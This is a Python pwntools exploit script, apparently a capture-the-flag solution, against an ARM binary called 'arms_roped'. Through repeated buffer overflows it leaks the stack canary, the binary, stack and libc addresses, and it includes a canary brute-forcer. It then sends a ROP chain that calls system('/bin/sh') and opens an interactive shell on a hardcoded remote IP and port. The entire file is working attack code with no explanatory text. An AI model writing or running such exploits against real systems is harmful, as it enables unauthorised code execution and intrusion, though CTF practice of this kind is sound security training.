import re
import binascii
from pwn import *
from time import sleep
import traceback

elf = context.binary = ELF('./arms_roped', checksec=False)
context.terminal = ['tmux', 'splitw', '-h', '-p', '60', '-I']
context.log_level = "WARNING"
gdb_debug = False

def start_local(isDebug, argv=[], *a, **kw):
    if args.GDB or isDebug:
        return process(["qemu-arm", "-g", "1234", "-L", "/usr/arm-linux-gnueabihf", elf.path])
    else:
        return process(["qemu-arm", "-L", "/usr/arm-linux-gnueabihf", elf.path])

def check_crash(payload):
    p = start_local(False)
    sleep(0.1)
    p.sendline(payload)
    try:
        response = p.recv(timeout=1)  
        p.close()
        print(response)
        check = payload in response
        return not check
    except Exception as e:
        print(f"Caught an exception: {e}")
        traceback.print_exc()
        p.close()
        return True

def bruteforce_canary():
    known_canary = b"\x00"  # start with the known byte
    for i in range(1, 4):  # brute-force the next 3 bytes
        for j in range(256):  # for each possible byte value
            payload = b"A" * offset_to_canary + known_canary + bytes([j])
            if not check_crash(payload):
                known_canary += bytes([j])
                print(f"Found byte: {hex(j)}")
                break
    return known_canary

def find_offset_to_canary():
    pattern = cyclic(100)
    p = start_local(False)
    sleep(0.1)
    p.sendline(pattern)
    try:
        p.recv(timeout=2)
    except EOFError:
        # This means the process crashed
        pass
    except Exception as e:
        print(f"Caught an exception: {e}")
        traceback.print_exc()

    core = p.corefile
    pattern_offset = cyclic_find(core.read(core.r11, 4))
    return pattern_offset

def leak_binary_stack() -> int:
    print("Leaking stack...")
    sleep(1)

    payload = b"h" * 88
    p.sendline(payload)

    response = p.recvuntil(b"\n", drop=True)
    leaked_return_address = response[88:92]  # These 4 bytes after the overflow are actually the return address the function will return to.
    address_int = int.from_bytes(leaked_return_address, 'little')
    stack_base = address_int - 0x28dc # <-- docker
    
    print(f"Leaked return address: {hex(address_int)}")
    print(f"stack's base: {hex(stack_base)}")
    return stack_base
    
def leak_libc_base() -> int:
    print("Leaking libc base...")
    sleep(1)

    payload = flat(
        b"quit", # this will be compared and will cause the loop to exit and get to the return address.
        b"d" * 28, # padding to reach the canary
        p32(leaked_canary), # this is the leaked canary placed at the right spot
        b"e" * 12, # extra padding to reach PC
        p32(bin_r3_pc),
        p32(bin_puts_plt),
        p32(bin_pop_r4_to_r8_sb_sl_pc), # address we want to reach (start of ROP)        
        p32(0x0),
        b"g" * 4,
        p32(0x1),
        p32(bin_puts_got),
        b"g" * 12,
        p32(bin_mov_r9_to_r2), 
        b"i" * 28,
        p32(elf.sym.main)
    )

    p.sendline(payload)
    response = p.recvuntil(b"\n", drop=True)
    # response = p.recv()
    first_four_bytes = response[:4]
    print(f"Leaked 4 bytes: {first_four_bytes.hex(' ')}")
    address_int = int.from_bytes(first_four_bytes, 'little')
    print(f"{hex(address_int)=}")
    possible_offset = 0x00049ba5 # from challenge provided libc.so.6 file offset to puts

    libc_base = address_int - possible_offset #
    return libc_base

def leak_binary_base() -> int:
    print("Leaking binary's base...")
    sleep(1)

    payload = b"b" * 48
    p.sendline(payload)

    response = p.recvuntil(b"\n", drop=True)
    leaked_return_address = response[48:52]  # These 4 bytes after the overflow are actually the return address the function will return to.
    address_int = int.from_bytes(leaked_return_address, 'little')
    binary_base = address_int - 0x948 # This is the offset of the instruction that comes after calling string_storer() call
    print(f"Leaked return address: {hex(address_int)}")
    print(f"Binary's base: {hex(binary_base)}")
    elf.address = binary_base
    return binary_base

def leak_canary() -> int:
    print("Leaking canary...")
    sleep(1)
    payload = b"a" * 32 + b"\x01"  # You can use any non-null byte for the 33rd byte

    p.sendline(payload)

    # Receive echoed output
    response = p.recvuntil(b"\n", drop=True)

    # Extract the canary
    leaked_canary = response[33:]  # Adjust this based on the output and the exact offset
    extraction = leaked_canary.hex(" ").split(" ")
    canary = extraction[2] + extraction[1] + extraction[0]
    print(f"Leaked Canary: 0x{canary}00")
    canary = canary + '00'
    canary_int = int(canary, 16)
    return canary_int

p = remote("83.136.254.158", 46219)
leaked_canary = leak_canary()
bin_base = leak_binary_base()
stack_base = leak_binary_stack()
sleep(0.1)

bin_r3_pc = bin_base + 0x56c
bin_continue = bin_base + 0x9c8
bin_buffer_address = stack_base + 0x1cc4 # <-- Docker
bin_pop_r4_to_r10 = bin_base + 0x9ec
bin_puts_got = elf.got.puts
bin_puts_plt = elf.plt.puts
bin_mov_r3_to_r0 = bin_base + 0x00000974 #0x00000974 : mov r0, r3 ; sub sp, fp, #8 ; pop {r4, fp, pc}
bin_pop_r4_to_r8_sb_sl_pc = bin_base + 0x000009ec
bin_mov_r9_to_r2 = bin_base + 0x000009d0

print(f"{hex(stack_base)=}")
print(f"{hex(bin_pop_r4_to_r10)=}")
print(f"{hex(bin_puts_got)=}")
print(f"{hex(bin_puts_plt)=}")
print(f"{hex(bin_buffer_address)=}")
print(f"{hex(bin_buffer_address+52)=}")

libc_address = leak_libc_base()
bin_sh = libc_address + 0x000dce0c
system_address = libc_address + 0x2f50f
libc_pop_r0_r4_pc = libc_address + 0x0005bebc
libc_pop_r0_to_r2_ip_sp_pc = libc_address + 0x00017e70

print(f"{hex(libc_address)=}")
print(f"{hex(bin_sh)=}")
print(f"{hex(system_address)=}")
print(f"{hex(libc_pop_r0_r4_pc)=}")


print("Going for system!!!!")
sleep(0.5)

#ret2system
payload = flat(
    b"quit", # this will be compared and will cause the loop to exit and get to the return address.
    b"d" * 28, # padding to reach the canary
    p32(leaked_canary), # this is the leaked canary placed at the right spot
    b"e" * 12, # extra padding to reach PC
    p32(libc_pop_r0_r4_pc), # address we want to reach (start of ROP)
    bin_sh,
    b"f" * 4,
    p32(system_address),
    p32(elf.sym.main)
)

p.sendline(payload)
p.interactive()
